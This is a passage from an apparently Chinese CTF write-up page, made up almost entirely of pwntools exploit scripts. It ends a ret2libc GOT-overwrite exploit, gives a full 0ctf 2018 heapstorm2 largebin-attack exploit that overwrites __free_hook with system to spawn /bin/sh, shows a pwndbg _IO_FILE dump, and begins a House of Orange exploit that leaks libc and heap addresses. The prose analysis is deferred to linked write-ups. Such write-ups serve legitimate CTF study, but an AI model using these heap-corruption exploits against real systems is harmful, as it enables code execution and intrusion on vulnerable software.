</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>lsmr</span><span class=p>,</span><span class=s1>&#39;__libc_start_main_ret&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=0ctf_2018_heapstorm2>0ctf_2018_heapstorm2</h3><p>åˆ†æå…ˆå’•äº†ï¼Œç­‰å®Œå…¨ç†è§£äº†å†è¡¥å……ã€‚å…ˆæ”¾ä¸€äº›å‚è€ƒçš„ wpï¼š</p><ul><li><a href=http://eternalsakura13.com/2018/04/03/heapstorm2/ target=_blank rel="noopener noreffer">wp1</a></li><li><a href=https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/ target=_blank rel="noopener noreffer">wp2</a></li><li><a href=https://github.com/willinin/0ctf2018/blob/master/heapstorm2/heapstorm2.md target=_blank rel="noopener noreffer">wp3</a></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Size:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;</span><span class=si>%d</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Command:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Index:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Size:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s1>&#39;Content:&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Command:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Index:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Command:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Index:&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Command:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pos1</span> <span class=o>=</span> <span class=n>m</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;]: &#39;</span><span class=p>)</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=s1>&#39;]: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pos2</span> <span class=o>=</span> <span class=n>m</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>1.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>m</span><span class=p>[</span><span class=n>pos1</span><span class=p>:</span><span class=n>pos2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># 0</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x508</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># 2</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x4f0</span><span class=p>,</span><span class=mh>0x500</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># 3</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x508</span><span class=p>)</span> <span class=c1># 4</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># 5</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x4f0</span><span class=p>,</span><span class=mh>0x500</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># 6</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x18</span><span class=o>-</span><span class=mi>12</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x4d8</span><span class=p>)</span> <span class=c1># 7</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x38</span><span class=p>)</span> <span class=c1># 1</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x4e8</span><span class=p>)</span> <span class=c1># 2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x18</span><span class=o>-</span><span class=mi>12</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=c1># 4</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x4d8</span><span class=p>)</span> <span class=c1># 8</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x48</span><span class=p>)</span> <span class=c1># 4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x4e8</span><span class=p>)</span> <span class=c1># 2</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>storage</span> <span class=o>=</span> <span class=mh>0x13370800</span>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=n>storage</span><span class=o>-</span><span class=mh>0x20</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x4f1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>fake</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>7</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x4e1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>fake</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>fake</span><span class=o>-</span><span class=mh>0x18</span><span class=o>-</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>add</span><span class=p>(</span><span class=mh>0x48</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Try again?&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x13377331</span><span class=p>,</span><span class=n>storage</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x13377331</span><span class=p>,</span><span class=n>storage</span><span class=p>,</span><span class=mh>0x1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>payload</span> <span class=o>+</span> <span class=n>flat</span><span class=p>(</span><span class=n>storage</span><span class=o>-</span><span class=mh>0x20</span><span class=o>+</span><span class=mi>3</span><span class=p>,</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>payload</span> <span class=o>+</span> <span class=n>flat</span><span class=p>(</span><span class=n>heap</span><span class=o>+</span><span class=mh>0x10</span><span class=p>,</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span><span class=o>-</span><span class=mi>88</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>free_hook</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p3</span> <span class=o>=</span> <span class=n>payload</span> <span class=o>+</span> <span class=n>flat</span><span class=p>(</span><span class=n>free_hook</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>storage</span><span class=o>+</span><span class=mh>0x50</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Index:&#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=houseoforange_hitcon_2016>houseoforange_hitcon_2016</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pwndbg&gt; p *(struct _IO_FILE*)0x555b7d04b4f0
</span></span><span class=line><span class=cl>$2 = {
</span></span><span class=line><span class=cl>  _flags = 1852400175,
</span></span><span class=line><span class=cl>  _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;,
</span></span><span class=line><span class=cl>  _IO_read_end = 0x0,
</span></span><span class=line><span class=cl>  _IO_read_base = 0x7f29a0f30510 &#34;&#34;,
</span></span><span class=line><span class=cl>  _IO_write_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;,
</span></span><span class=line><span class=cl>  _IO_write_ptr = 0x3 &lt;error: Cannot access memory at address 0x3&gt;,
</span></span><span class=line><span class=cl>  _IO_write_end = 0x0,
</span></span><span class=line><span class=cl>  _IO_buf_base = 0x0,
</span></span><span class=line><span class=cl>  _IO_buf_end = 0x0,
</span></span><span class=line><span class=cl>  _IO_save_base = 0x0,
</span></span><span class=line><span class=cl>  _IO_backup_base = 0x0,
</span></span><span class=line><span class=cl>  _IO_save_end = 0x0,
</span></span><span class=line><span class=cl>  _markers = 0x0,
</span></span><span class=line><span class=cl>  _chain = 0x0,
</span></span><span class=line><span class=cl>  _fileno = 0,
</span></span><span class=line><span class=cl>  _flags2 = 0,
</span></span><span class=line><span class=cl>  _old_offset = 0,
</span></span><span class=line><span class=cl>  _cur_column = 0,
</span></span><span class=line><span class=cl>  _vtable_offset = 0 &#39;\000&#39;,
</span></span><span class=line><span class=cl>  _shortbuf = &#34;&#34;,
</span></span><span class=line><span class=cl>  _lock = 0x0,
</span></span><span class=line><span class=cl>  _offset = 0,
</span></span><span class=line><span class=cl>  _codecvt = 0x0,
</span></span><span class=line><span class=cl>  _wide_data = 0x0,
</span></span><span class=line><span class=cl>  _freeres_list = 0x0,
</span></span><span class=line><span class=cl>  _freeres_buf = 0x0,
</span></span><span class=line><span class=cl>  __pad5 = 0,
</span></span><span class=line><span class=cl>  _mode = 0,
</span></span><span class=line><span class=cl>  _unused2 = &#39;\000&#39; &lt;repeats 19 times&gt;
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice :&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice :&#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice :&#39;</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>useless</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=mh>0x1f00000001</span><span class=p>,</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span> <span class=o>+</span> <span class=n>useless</span> <span class=o>+</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0xfa1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span> <span class=c1># corrupt top chunk</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>)</span> <span class=c1># old_top -&gt; unsorted</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x400</span><span class=p>)</span> <span class=c1># slice old top</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>))</span><span class=o>-</span><span class=mi>1640</span><span class=o>-</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__malloc_hook&#39;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;base&#39;</span><span class=p>,</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>io_list_all</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_list_all&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;large chunk:
</span></span></span><span class=line><span class=cl><span class=s1>0x56512e53b0c0:	0x0000000000000000 0x0000000000000411
</span></span></span><span class=line><span class=cl><span class=s1>0x56512e53b0d0:	0x6161616161616161	0x00007f01ea979188
</span></span></span><span class=line><span class=cl><span class=s1>0x56512e53b0e0:	0x000056512e53b0c0	0x000056512e53b0c0
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0xc0</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;heap&#39;</span><span class=p>,</span><span class=n>heap</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># jump_table+0x18</span>
